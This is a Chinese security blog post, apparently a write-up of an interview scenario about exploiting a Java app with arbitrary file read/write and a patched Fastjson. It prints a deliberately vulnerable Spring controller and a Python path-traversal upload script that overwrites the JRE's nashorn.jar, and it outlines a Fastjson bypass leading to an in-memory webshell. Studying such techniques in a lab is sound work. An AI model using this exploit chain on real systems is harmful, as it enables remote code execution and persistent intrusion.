---
title: 这道面试题，你的思路是什么？
url: https://mp.weixin.qq.com/s/5sciYDc2glITodaDmQ4gGA
source: Doonsec's feed
date: 2026-02-08
fetch_date: 2026-02-09T04:18:23.427276
---

# 这道面试题，你的思路是什么？

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/KA5KNdck7pfz4rzb0fdaWFoffA3FGxVXYN9JGubyAic0VeS4bM8EG7qYWB8F7moKpIFmic7PP2gU5c0JPaXkUfnot3FB5AXAWsqW8PzPsYx2E/0?wx_fmt=jpeg)

# 这道面试题，你的思路是什么？

原创

ptr
ptr

UpRoot

![]()

在小说阅读器中沉浸阅读

### 前言

一道实习面试场景题：目标存在任意写/读、Fastjson没洞、不出网、jar包部署，你怎么打？

---

### 思考

类似于Fastjson用io链写文件，只不过这里的io链被替换为了任意写/读。

既然有Fastjson就可以通过`@type`对类进行加载，Fastjson没洞说明版本是1.2.83，存在白名单，对加载的类会进行check，但还是有解决办法的，就是通过懒加载jar包替换。

jar包替换就得知道lib/ext目录在哪，这时候任意读作用的就用来了，可以通过读Linux系统全文件路径数据库来解决jar包路径问题。

---

### 解题

本地写一个环境出来，漏洞代码如下：

```
package com.ptr.demo1.vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.core.io.FileSystemResource;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.UUID;

@RestController
publicclass vulController {

    privatestaticfinal String UPLOAD_DIR = System.getProperty("user.dir") + "/uploads/";

    @PostMapping("/api/login")
    public String login(@RequestBody String jsonString){
        try {
            return JSON.parseObject(jsonString).toJSONString();
        }catch (Exception e){
            return e.getMessage();
        }
    }

    @PostMapping("/api/upload")
    public String upload(@RequestParam("file") MultipartFile file) {
        if (file.isEmpty()) {
            return"上传失败，请选择文件";
        }
        try {
            String fileName = file.getOriginalFilename();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd/");
            String datePath = sdf.format(new Date());
            File dest = new File(UPLOAD_DIR + datePath + fileName);
            if (!dest.getParentFile().exists()) {
                dest.getParentFile().mkdirs();
            }
            file.transferTo(dest);
            return"上传成功，文件路径: " + datePath + fileName;

        } catch (IOException e) {
            e.printStackTrace();
            return"上传失败: " + e.getMessage();
        }
    }

    @PostMapping("/api/download")
    public ResponseEntity<Resource> download(String fileName) throws UnsupportedEncodingException {
        File file = new File(UPLOAD_DIR + fileName);

        if (!file.exists()) {
            System.out.println(1);
            return ResponseEntity.notFound().build();
        }

        String encodedFileName = URLEncoder.encode(file.getName(), "UTF-8").replaceAll("\\+", "%20");

        HttpHeaders headers = new HttpHeaders();
        headers.add(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename*=UTF-8''" + encodedFileName);

        return ResponseEntity.ok()
                .headers(headers)
                .contentLength(file.length())
                .contentType(MediaType.APPLICATION_OCTET_STREAM)
                .body(new FileSystemResource(file));
    }
}
```

通过任意读拿到jre路径：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/KA5KNdck7pcSlTqj2ukTUCehZhnqAXZSw9nKkOViayBfnWXPialbBsfFZOBFsSPwTHaVe1UxUKw7EegXGoENxmPibZOO7t8KQhMqY1rba4A00k/640?wx_fmt=png&from=appmsg)

构造一个恶意的jar，这里用的是nashorn.jar。

为了bypassFastjson的安全检测，需要指定类为@JSONType。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/KA5KNdck7pentMsvtXSNHF5Tibibf24gxmzYU1nSVG4icibH9MwnnYd2OtasL6z4uib2FictWc4Tbcv9ZYlMrZxWKWauB6WlvT8oTF5MmSwXjr2EY/640?wx_fmt=png&from=appmsg)

写一个python脚本进行可以跨目录的任意文件上传，覆盖原来的nashorn.jar。

```
import requests

url = "http://192.168.0.15:8089/api/upload"
files = {'file': ('../../../../../../../../../../../usr/lib/jvm/java-1.8.0-openjdk-1.8.0.362.b09-4.el9.x86_64/jre/lib/ext/nashorn.jar',open('nashorn.jar', 'rb'))}

response = requests.post(url, files=files,timeout=5)

print(response.text)
```

用defineClass直接打入内存马，实现不出网的shell。

![](https://mmbiz.qpic.cn/mmbiz_png/KA5KNdck7pe1oTJRhzvOiczn2GhIVEjXj8KdOXFmfvlCrqVgkEnUmjSVXG2vvQUe6Qf6hKI1ljfAmaXxSbpgibruNQ2R5kJFDRYM6kd4kQS0U/640?wx_fmt=png&from=appmsg)- END -

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/xVRYUEtHibmvaoURJ0GJicia6k2fibfoowzduKTIkiaiaEF2Z2jrzjeX9JaCet9jpQRba16OImWqgkwEuNtibYlTjsoQA/0?wx_fmt=png)

UpRoot

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/xVRYUEtHibmvaoURJ0GJicia6k2fibfoowzduKTIkiaiaEF2Z2jrzjeX9JaCet9jpQRba16OImWqgkwEuNtibYlTjsoQA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过